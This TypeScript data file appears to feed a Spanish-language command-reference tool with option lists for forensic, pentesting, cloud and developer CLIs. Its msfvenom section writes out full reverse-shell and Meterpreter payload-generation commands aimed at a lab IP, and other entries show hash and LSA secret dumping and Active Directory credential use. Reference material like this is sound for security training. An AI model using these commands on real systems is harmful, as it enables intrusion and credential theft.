import type { CommandSuboption } from '../types';

/**
 * Segunda capa de subopciones: plugins, payloads, fuentes OSINT, formatos de
 * nube y comandos interactivos que también admiten valores discretos.
 */
export const MORE_PARAM_OPTIONS: Record<string, Record<string, CommandSuboption[]>> = {
  volatility3: {
    '<plugin>': [
      { value: 'windows.pslist', desc: 'Lista procesos activos y terminados desde la memoria.', example: 'volatility3 -f memoria.raw windows.pslist' },
      { value: 'windows.pstree', desc: 'Muestra procesos en forma de árbol con sus padres.', example: 'volatility3 -f memoria.raw windows.pstree' },
      { value: 'windows.cmdline', desc: 'Extrae la línea de comandos de cada proceso.', example: 'volatility3 -f memoria.raw windows.cmdline' },
      { value: 'windows.netstat', desc: 'Lista conexiones y sockets abiertos en el volcado.', example: 'volatility3 -f memoria.raw windows.netstat' },
      { value: 'windows.dlllist', desc: 'Enumera las DLL cargadas por proceso.', example: 'volatility3 -f memoria.raw windows.dlllist --pid 1234' },
      { value: 'windows.malfind', desc: 'Busca regiones de memoria ejecutables y sospechosas.', example: 'volatility3 -f memoria.raw windows.malfind' },
      { value: 'windows.hashdump', desc: 'Extrae hashes locales SAM del volcado de memoria.', example: 'volatility3 -f memoria.raw windows.hashdump' },
      { value: 'windows.lsadump', desc: 'Extrae secretos LSA almacenados en memoria.', example: 'volatility3 -f memoria.raw windows.lsadump' },
      { value: 'windows.registry.hivelist', desc: 'Lista los hives del registro cargados en memoria.', example: 'volatility3 -f memoria.raw windows.registry.hivelist' },
      { value: 'windows.filescan', desc: 'Enumera objetos de archivo presentes en memoria.', example: 'volatility3 -f memoria.raw windows.filescan' },
      { value: 'windows.netscan', desc: 'Reconstruye conexiones de red a partir de estructuras del kernel.', example: 'volatility3 -f memoria.raw windows.netscan' },
      { value: 'linux.pslist', desc: 'Lista procesos de un volcado Linux.', example: 'volatility3 -f memoria.raw linux.pslist' },
      { value: 'linux.bash', desc: 'Recupera historial de comandos bash de la memoria.', example: 'volatility3 -f memoria.raw linux.bash' },
      { value: 'linux.netstat', desc: 'Lista conexiones de red en un volcado Linux.', example: 'volatility3 -f memoria.raw linux.netstat' },
      { value: 'linux.malfind', desc: 'Busca regiones anónimas ejecutables en Linux.', example: 'volatility3 -f memoria.raw linux.malfind' },
    ],
    '-r <formato>': [
      { value: 'pretty', desc: 'Tabla legible pensada para revisión manual.', example: 'volatility3 -f memoria.raw windows.pslist -r pretty' },
      { value: 'csv', desc: 'CSV para hojas de cálculo y filtros posteriores.', example: 'volatility3 -f memoria.raw windows.pslist -r csv' },
      { value: 'json', desc: 'JSON para automatización e integración con SIEM.', example: 'volatility3 -f memoria.raw windows.pslist -r json' },
      { value: 'jsonl', desc: 'JSON Lines, un objeto por línea para streaming.', example: 'volatility3 -f memoria.raw windows.pslist -r jsonl' },
      { value: 'sqlite', desc: 'Base de datos SQLite para consultas complejas.', example: 'volatility3 -f memoria.raw windows.pslist -r sqlite' },
      { value: 'xlsx', desc: 'Libro de Excel con los resultados del plugin.', example: 'volatility3 -f memoria.raw windows.pslist -r xlsx' },
    ],
  },

  msfvenom: {
    '-p <payload>': [
      { value: 'windows/x64/meterpreter/reverse_tcp', desc: 'Meterpreter de 64 bits con conexión inversa TCP.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o lab.exe' },
      { value: 'windows/meterpreter/reverse_https', desc: 'Meterpreter de 32 bits sobre HTTPS.', example: 'msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.2 LPORT=443 -f exe -o lab.exe' },
      { value: 'linux/x64/meterpreter/reverse_tcp', desc: 'Meterpreter para Linux x86_64.', example: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o lab.elf' },
      { value: 'linux/x64/shell_reverse_tcp', desc: 'Shell inversa simple para Linux x86_64.', example: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o lab.elf' },
      { value: 'php/meterpreter/reverse_tcp', desc: 'Payload PHP para un servidor web comprometido.', example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw -o lab.php' },
      { value: 'python/meterpreter/reverse_tcp', desc: 'Payload Python para pruebas de concepto.', example: 'msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw -o lab.py' },
      { value: 'android/meterpreter/reverse_tcp', desc: 'APK de prueba para un dispositivo Android propio.', example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -o lab.apk' },
      { value: 'osx/x64/meterpreter/reverse_tcp', desc: 'Meterpreter para macOS x86_64.', example: 'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f macho -o lab.macho' },
    ],
    '-f <formato>': [
      { value: 'exe', desc: 'Genera un ejecutable nativo de Windows con el payload.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o lab.exe' },
      { value: 'elf', desc: 'Ejecutable ELF para Linux.', example: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o lab.elf' },
      { value: 'macho', desc: 'Binario Mach-O para macOS.', example: 'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f macho -o lab.macho' },
      { value: 'raw', desc: 'Datos sin contenedor, útiles para incrustar en otro formato.', example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw -o lab.php' },
      { value: 'python', desc: 'Script Python que genera el payload.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f python' },
      { value: 'c', desc: 'Array C para incrustar el payload en un programa.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f c' },
      { value: 'js_be', desc: 'JavaScript con orden de bytes big-endian.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f js_be' },
      { value: 'war', desc: 'Archivo WAR para desplegar en un servidor Java.', example: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war -o lab.war' },
      { value: 'jar', desc: 'Archivo JAR ejecutable en una JVM.', example: 'msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f jar -o lab.jar' },
      { value: 'apk', desc: 'Aplicación Android de prueba.', example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -o lab.apk' },
      { value: 'psh', desc: 'Genera un script de PowerShell con el payload.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f psh -o lab.ps1' },
      { value: 'vba', desc: 'Macro VBA para documentos de Office de laboratorio.', example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f vba' },
      { value: 'asp', desc: 'Script ASP para un servidor IIS antiguo.', example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f asp -o lab.asp' },
      { value: 'aspx', desc: 'Script ASPX para IIS moderno.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f aspx -o lab.aspx' },
    ],
    '--platform <plataforma>': [
      { value: 'windows', desc: 'Fuerza payloads y formatos de Windows.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -f exe LHOST=10.10.14.2 LPORT=4444 -o lab.exe' },
      { value: 'linux', desc: 'Fuerza payloads y formatos de Linux.', example: 'msfvenom -p linux/x64/shell_reverse_tcp --platform linux -f elf LHOST=10.10.14.2 LPORT=4444 -o lab.elf' },
      { value: 'osx', desc: 'Fuerza payloads y formatos de macOS.', example: 'msfvenom -p osx/x64/meterpreter/reverse_tcp --platform osx -f macho LHOST=10.10.14.2 LPORT=4444 -o lab.macho' },
      { value: 'android', desc: 'Fuerza payloads y formatos de Android.', example: 'msfvenom -p android/meterpreter/reverse_tcp --platform android LHOST=10.10.14.2 LPORT=4444 -o lab.apk' },
    ],
    '-a <arquitectura>': [
      { value: 'x86', desc: 'Arquitectura Intel de 32 bits.', example: 'msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=10.10.14.2 LPORT=4444 -f exe -o lab32.exe' },
      { value: 'x64', desc: 'Arquitectura Intel/AMD de 64 bits.', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=10.10.14.2 LPORT=4444 -f exe -o lab64.exe' },
      { value: 'armle', desc: 'ARM little-endian, habitual en dispositivos embebidos.', example: 'msfvenom -p linux/armle/meterpreter/reverse_tcp -a armle LHOST=10.10.14.2 LPORT=4444 -f elf -o lab-arm.elf' },
      { value: 'aarch64', desc: 'ARM de 64 bits para Linux moderno.', example: 'msfvenom -p linux/aarch64/meterpreter/reverse_tcp -a aarch64 LHOST=10.10.14.2 LPORT=4444 -f elf -o lab-arm64.elf' },
    ],
  },

  aws: {
    '--output json|table|text': [
      { value: 'json', desc: 'JSON completo, ideal para jq y automatización.', example: 'aws sts get-caller-identity --output json' },
      { value: 'table', desc: 'Tabla legible para revisión manual.', example: 'aws ec2 describe-instances --output table' },
      { value: 'text', desc: 'Texto delimitado por tabuladores para scripts.', example: 'aws iam list-users --output text' },
      { value: 'yaml', desc: 'YAML para lectura y comparación de configuraciones.', example: 'aws s3api get-bucket-acl --bucket mi-bucket --output yaml' },
    ],
  },

  az: {
    '--output json|table': [
      { value: 'json', desc: 'JSON completo para procesar con jq.', example: 'az account show --output json' },
      { value: 'table', desc: 'Tabla legible para revisión manual.', example: 'az role assignment list --output table' },
      { value: 'yaml', desc: 'YAML para comparar configuraciones.', example: 'az network nsg list --output yaml' },
      { value: 'tsv', desc: 'Valores separados por tabuladores para scripts.', example: 'az storage account list --output tsv' },
      { value: 'none', desc: 'No imprime salida; útil solo para comprobar el código de estado.', example: 'az account show --output none' },
    ],
  },

  gcloud: {
    '--format=json': [
      { value: 'json', desc: 'JSON completo para automatización.', example: 'gcloud projects list --format=json' },
      { value: 'yaml', desc: 'YAML legible para comparar configuraciones.', example: 'gcloud compute firewall-rules list --format=yaml' },
      { value: 'table', desc: 'Tabla con columnas seleccionadas.', example: 'gcloud iam service-accounts list --format=table' },
      { value: 'csv', desc: 'CSV para hojas de cálculo.', example: 'gcloud storage buckets list --format=csv' },
      { value: 'value', desc: 'Solo los valores solicitados, sin formato adicional.', example: 'gcloud projects list --format="value(projectId)"' },
    ],
  },

  'airodump-ng': {
    '--output-format <fmt>': [
      { value: 'pcap', desc: 'Captura de paquetes para analizar con Wireshark o tshark.', example: 'airodump-ng -w captura --output-format pcap wlan0mon' },
      { value: 'ivs', desc: 'Formato clásico de vectores de inicialización para WEP.', example: 'airodump-ng -w captura --output-format ivs wlan0mon' },
      { value: 'csv', desc: 'CSV con redes y clientes detectados.', example: 'airodump-ng -w captura --output-format csv wlan0mon' },
      { value: 'kismet', desc: 'Formato Kismet para análisis inalámbrico.', example: 'airodump-ng -w captura --output-format kismet wlan0mon' },
      { value: 'netxml', desc: 'XML de redes para herramientas de mapeo.', example: 'airodump-ng -w captura --output-format netxml wlan0mon' },
      { value: 'gps', desc: 'Añade coordenadas GPS cuando hay receptor.', example: 'airodump-ng -w captura --output-format gps wlan0mon' },
    ],
    '--band <a|b|g>': [
      { value: 'a', desc: 'Banda de 5 GHz, canales altos y menos congestión.', example: 'airodump-ng --band a wlan0mon' },
      { value: 'b', desc: 'Banda de 2,4 GHz, canales 1-14.', example: 'airodump-ng --band b wlan0mon' },
      { value: 'g', desc: 'Banda de 2,4 GHz con modulación OFDM.', example: 'airodump-ng --band g wlan0mon' },
      { value: 'abg', desc: 'Escucha todas las bandas soportadas por el adaptador.', example: 'airodump-ng --band abg wlan0mon' },
    ],
  },

  wapiti: {
    '-f <formato>': [
      { value: 'html', desc: 'Informe HTML con detalle por vulnerabilidad.', example: 'wapiti -u https://ejemplo.com -f html -o wapiti-report' },
      { value: 'json', desc: 'JSON para automatización e integración.', example: 'wapiti -u https://ejemplo.com -f json -o wapiti-report' },
      { value: 'xml', desc: 'XML para herramientas de reporting.', example: 'wapiti -u https://ejemplo.com -f xml -o wapiti-report' },
      { value: 'txt', desc: 'Texto plano fácil de revisar y versionar.', example: 'wapiti -u https://ejemplo.com -f txt -o wapiti-report' },
    ],
    '-m <módulos>': [
      { value: 'sql', desc: 'Pruebas de inyección SQL.', example: 'wapiti -u https://ejemplo.com -m sql' },
      { value: 'xss', desc: 'Pruebas de cross-site scripting.', example: 'wapiti -u https://ejemplo.com -m xss' },
      { value: 'file', desc: 'Inclusión y traversal de archivos.', example: 'wapiti -u https://ejemplo.com -m file' },
      { value: 'exec', desc: 'Inyección de comandos y ejecución remota.', example: 'wapiti -u https://ejemplo.com -m exec' },
      { value: 'ssrf', desc: 'Server-side request forgery.', example: 'wapiti -u https://ejemplo.com -m ssrf' },
      { value: 'csrf', desc: 'Ausencia o debilidad de tokens CSRF.', example: 'wapiti -u https://ejemplo.com -m csrf' },
      { value: 'backup', desc: 'Archivos de copia y respaldos expuestos.', example: 'wapiti -u https://ejemplo.com -m backup' },
      { value: 'methods', desc: 'Métodos HTTP peligrosos habilitados.', example: 'wapiti -u https://ejemplo.com -m methods' },
    ],
    '--scope <modo>': [
      { value: 'url', desc: 'Analiza solo la URL indicada.', example: 'wapiti -u https://ejemplo.com/login --scope url' },
      { value: 'folder', desc: 'Analiza la carpeta de la URL.', example: 'wapiti -u https://ejemplo.com/app/ --scope folder' },
      { value: 'domain', desc: 'Analiza todas las rutas del dominio autorizado.', example: 'wapiti -u https://ejemplo.com --scope domain' },
      { value: 'punk', desc: 'No respeta restricciones de ámbito; peligroso.', example: 'wapiti -u https://ejemplo.com --scope punk' },
    ],
  },

  'the-harvester': {
    '-b <fuentes>': [
      { value: 'google', desc: 'Búsqueda de correos, hosts y documentos en Google.', example: 'theHarvester -d ejemplo.com -b google' },
      { value: 'bing', desc: 'Resultados de Bing y nombres relacionados.', example: 'theHarvester -d ejemplo.com -b bing' },
      { value: 'duckduckgo', desc: 'Consulta resultados públicos de DuckDuckGo.', example: 'theHarvester -d ejemplo.com -b duckduckgo' },
      { value: 'crtsh', desc: 'Certificados de crt.sh para descubrir subdominios.', example: 'theHarvester -d ejemplo.com -b crtsh' },
      { value: 'dnsdumpster', desc: 'Registros DNS y hosts desde DNSDumpster.', example: 'theHarvester -d ejemplo.com -b dnsdumpster' },
      { value: 'otx', desc: 'Indicadores y dominios de AlienVault OTX.', example: 'theHarvester -d ejemplo.com -b otx' },
      { value: 'urlscan', desc: 'Resultados públicos de URLScan.', example: 'theHarvester -d ejemplo.com -b urlscan' },
      { value: 'virustotal', desc: 'Relaciones y subdominios desde VirusTotal.', example: 'theHarvester -d ejemplo.com -b virustotal' },
      { value: 'all', desc: 'Ejecuta todas las fuentes configuradas; más lento y ruidoso.', example: 'theHarvester -d ejemplo.com -b all' },
    ],
  },

  dnsrecon: {
    '-t <tipo>': [
      { value: 'std', desc: 'Enumeración estándar de registros A, AAAA, MX, NS y TXT.', example: 'dnsrecon -d ejemplo.com -t std' },
      { value: 'rvl', desc: 'Resolución inversa de un rango de direcciones.', example: 'dnsrecon -r 192.0.2.0/24 -t rvl' },
      { value: 'brt', desc: 'Fuerza bruta de subdominios con diccionario.', example: 'dnsrecon -d ejemplo.com -t brt -D subdominios.txt' },
      { value: 'srv', desc: 'Descubre registros SRV y servicios internos.', example: 'dnsrecon -d ejemplo.com -t srv' },
      { value: 'axfr', desc: 'Intenta transferencia de zona desde los NS.', example: 'dnsrecon -d ejemplo.com -t axfr' },
      { value: 'goo', desc: 'Búsqueda de subdominios en Google.', example: 'dnsrecon -d ejemplo.com -t goo' },
      { value: 'tld', desc: 'Comprueba el dominio en múltiples TLD.', example: 'dnsrecon -d ejemplo -t tld' },
      { value: 'zonewalk', desc: 'Intenta NSEC zone walking en DNSSEC.', example: 'dnsrecon -d ejemplo.com -t zonewalk' },
    ],
  },

  smbclient: {
    '-m <versión>': [
      { value: 'SMB1', desc: 'Fuerza SMB1 para equipos antiguos; protocolo inseguro.', example: 'smbclient //10.10.10.5/share -m SMB1 -N' },
      { value: 'SMB2', desc: 'Fuerza SMB2, habitual en Windows moderno.', example: 'smbclient //10.10.10.5/share -m SMB2 -U auditor' },
      { value: 'SMB3', desc: 'Fuerza SMB3 con cifrado y firmas modernas.', example: 'smbclient //10.10.10.5/share -m SMB3 -U auditor' },
      { value: 'NT1', desc: 'Alias antiguo de SMB1 en algunas versiones.', example: 'smbclient //10.10.10.5/share -m NT1 -N' },
    ],
    '-c "<comandos>"': [
      { value: 'ls', desc: 'Lista archivos del directorio actual.', example: 'smbclient //10.10.10.5/share -N -c "ls"' },
      { value: 'recurse ON', desc: 'Activa la recursión para listados y descargas.', example: 'smbclient //10.10.10.5/share -N -c "recurse ON; ls"' },
      { value: 'prompt OFF', desc: 'Desactiva la confirmación en mget y mput.', example: 'smbclient //10.10.10.5/share -N -c "prompt OFF; recurse ON; mget *"' },
      { value: 'get <archivo>', desc: 'Descarga un archivo concreto.', example: 'smbclient //10.10.10.5/share -N -c "get config.txt"' },
      { value: 'put <archivo>', desc: 'Sube un archivo; puede sobrescribir datos.', example: 'smbclient //10.10.10.5/share -N -c "put prueba.txt"' },
      { value: 'mkdir <dir>', desc: 'Crea un directorio en la compartición.', example: 'smbclient //10.10.10.5/share -N -c "mkdir auditoria"' },
      { value: 'del <archivo>', desc: 'Elimina un archivo de la compartición.', example: 'smbclient //10.10.10.5/share -N -c "del prueba.txt"' },
    ],
  },

  ldapsearch: {
    '-s <scope>': [
      { value: 'base', desc: 'Consulta solo el objeto base, sin recorrer el árbol.', example: 'ldapsearch -x -H ldap://10.10.10.5 -s base -b "dc=corp,dc=local"' },
      { value: 'one', desc: 'Consulta solo los hijos directos de la base.', example: 'ldapsearch -x -H ldap://10.10.10.5 -s one -b "dc=corp,dc=local"' },
      { value: 'sub', desc: 'Recorre todo el subárbol desde la base.', example: 'ldapsearch -x -H ldap://10.10.10.5 -s sub -b "dc=corp,dc=local" "(objectClass=user)"' },
      { value: 'children', desc: 'Recorre los descendientes, excluyendo el objeto base.', example: 'ldapsearch -x -H ldap://10.10.10.5 -s children -b "dc=corp,dc=local"' },
    ],
  },

  ldapdomaindump: {
    '-at <tipo>': [
      { value: 'NTLM', desc: 'Autenticación NTLM, la habitual en Active Directory.', example: 'ldapdomaindump -u usuario@corp.local -p "pass" -at NTLM dc.corp.local' },
      { value: 'SIMPLE', desc: 'Bind simple con usuario y contraseña.', example: 'ldapdomaindump -u "cn=usuario,dc=corp,dc=local" -p "pass" -at SIMPLE dc.corp.local' },
      { value: 'ANONYMOUS', desc: 'Intenta bind anónimo; rara vez funciona en AD moderno.', example: 'ldapdomaindump -at ANONYMOUS dc.corp.local' },
    ],
  },

  'bloodhound-python': {
    '-c <métodos>': [
      { value: 'All', desc: 'Recolecta todos los métodos disponibles; la opción más completa.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c All' },
      { value: 'Group', desc: 'Enumera grupos y sus miembros.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c Group' },
      { value: 'Session', desc: 'Recolecta sesiones y equipos donde hay usuarios conectados.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c Session' },
      { value: 'Trusts', desc: 'Enumera relaciones de confianza entre dominios.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c Trusts' },
      { value: 'ACL', desc: 'Recolecta ACL y permisos delegados.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c ACL' },
      { value: 'ObjectProps', desc: 'Obtiene propiedades de usuarios, equipos y grupos.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c ObjectProps' },
      { value: 'Container', desc: 'Enumera contenedores y unidades organizativas.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c Container' },
      { value: 'DCOnly', desc: 'Recolecta solo desde el controlador de dominio, sin tocar equipos.', example: 'bloodhound-python -u auditor -p "pass" -d corp.local -c DCOnly' },
    ],
  },

  crackmapexec: {
    'smb <target>': [
      { value: 'smb', desc: 'Protocolo SMB para shares, sesiones y credenciales.', example: 'crackmapexec smb 10.10.10.5 -u auditor -p "pass" --shares' },
      { value: 'ldap', desc: 'Protocolo LDAP para consultar Active Directory.', example: 'crackmapexec ldap dc.corp.local -u auditor -p "pass" --users' },
      { value: 'winrm', desc: 'WinRM para validar acceso remoto.', example: 'crackmapexec winrm 10.10.10.5 -u auditor -p "pass"' },
      { value: 'mssql', desc: 'Prueba credenciales contra Microsoft SQL Server.', example: 'crackmapexec mssql 10.10.10.5 -u sa -p "pass" --local-auth' },
      { value: 'ssh', desc: 'SSH para validar credenciales.', example: 'crackmapexec ssh 10.10.10.5 -u auditor -p "pass"' },
    ],
  },

  httpx: {
    '-mc <códigos>': [
      { value: '200', desc: 'Muestra solo respuestas correctas.', example: 'httpx -l urls.txt -mc 200' },
      { value: '200,204', desc: 'Incluye respuestas sin contenido.', example: 'httpx -l urls.txt -mc 200,204' },
      { value: '301,302', desc: 'Muestra redirecciones y su destino.', example: 'httpx -l urls.txt -mc 301,302 -location' },
      { value: '401,403', desc: 'Muestra recursos protegidos que existen.', example: 'httpx -l urls.txt -mc 401,403' },
      { value: '500', desc: 'Muestra errores del servidor.', example: 'httpx -l urls.txt -mc 500' },
      { value: 'all', desc: 'Muestra cualquier código; requiere filtros adicionales.', example: 'httpx -l urls.txt -mc all -fc 404' },
    ],
  },

  httpie: {
    'GET|POST|PUT|PATCH|DELETE': [
      { value: 'GET', desc: 'Solicita un recurso sin enviar cuerpo.', example: 'http GET https://api.ejemplo.com/items' },
      { value: 'POST', desc: 'Crea un recurso o envía datos al servidor.', example: 'http POST https://api.ejemplo.com/items name=prueba' },
      { value: 'PUT', desc: 'Reemplaza un recurso completo.', example: 'http PUT https://api.ejemplo.com/items/7 name=actualizado' },
      { value: 'PATCH', desc: 'Modifica parcialmente un recurso.', example: 'http PATCH https://api.ejemplo.com/items/7 name=parcial' },
      { value: 'DELETE', desc: 'Elimina un recurso; verifica el objetivo antes.', example: 'http DELETE https://api.ejemplo.com/items/7' },
      { value: 'HEAD', desc: 'Obtiene solo cabeceras y estado.', example: 'http HEAD https://ejemplo.com' },
      { value: 'OPTIONS', desc: 'Consulta los métodos permitidos por el servidor.', example: 'http OPTIONS https://api.ejemplo.com/items' },
    ],
  },

  xh: {
    'GET|POST|PUT|PATCH|DELETE': [
      { value: 'GET', desc: 'Solicita un recurso sin cuerpo.', example: 'xh GET https://api.ejemplo.com/items' },
      { value: 'POST', desc: 'Envía datos para crear un recurso.', example: 'xh POST https://api.ejemplo.com/items name=prueba' },
      { value: 'PUT', desc: 'Reemplaza un recurso completo.', example: 'xh PUT https://api.ejemplo.com/items/7 name=actualizado' },
      { value: 'PATCH', desc: 'Actualiza parcialmente un recurso.', example: 'xh PATCH https://api.ejemplo.com/items/7 name=parcial' },
      { value: 'DELETE', desc: 'Elimina un recurso del servidor.', example: 'xh DELETE https://api.ejemplo.com/items/7' },
      { value: 'HEAD', desc: 'Solicita solo las cabeceras de respuesta.', example: 'xh HEAD https://ejemplo.com' },
      { value: 'OPTIONS', desc: 'Descubre métodos y capacidades del endpoint.', example: 'xh OPTIONS https://api.ejemplo.com/items' },
    ],
  },

  git: {
    'clone <url>': [
      { value: '--depth 1', desc: 'Clona solo el último commit, más rápido y ligero.', example: 'git clone --depth 1 https://github.com/org/repo.git' },
      { value: '--branch <rama>', desc: 'Clona una rama concreta en lugar de la predeterminada.', example: 'git clone --branch develop https://github.com/org/repo.git' },
      { value: '--recurse-submodules', desc: 'Inicializa también los submódulos.', example: 'git clone --recurse-submodules https://github.com/org/repo.git' },
    ],
    'status': [
      { value: '--short', desc: 'Salida compacta con dos columnas de estado.', example: 'git status --short' },
      { value: '--branch', desc: 'Muestra la rama y su relación con el remoto.', example: 'git status --short --branch' },
      { value: '--ignored', desc: 'Incluye archivos ignorados por .gitignore.', example: 'git status --ignored --short' },
    ],
    'log --oneline --graph': [
      { value: '--all', desc: 'Incluye todas las ramas y referencias.', example: 'git log --all --oneline --graph --decorate' },
      { value: '--since=<fecha>', desc: 'Limita a commits posteriores a una fecha.', example: 'git log --since="30 days ago" --oneline' },
      { value: '--author=<patrón>', desc: 'Filtra por autor del commit.', example: 'git log --author="Ana" --oneline' },
      { value: '-S <cadena>', desc: 'Busca commits que cambiaron el número de apariciones de una cadena.', example: 'git log -S "password" --oneline --all' },
    ],
    'stash': [
      { value: 'push', desc: 'Guarda cambios actuales sin commitear.', example: 'git stash push -m "trabajo en curso"' },
      { value: 'list', desc: 'Lista los stashes guardados.', example: 'git stash list' },
      { value: 'pop', desc: 'Aplica y elimina el último stash.', example: 'git stash pop' },
      { value: 'drop', desc: 'Elimina un stash sin aplicarlo.', example: 'git stash drop stash@{0}' },
    ],
  },
};
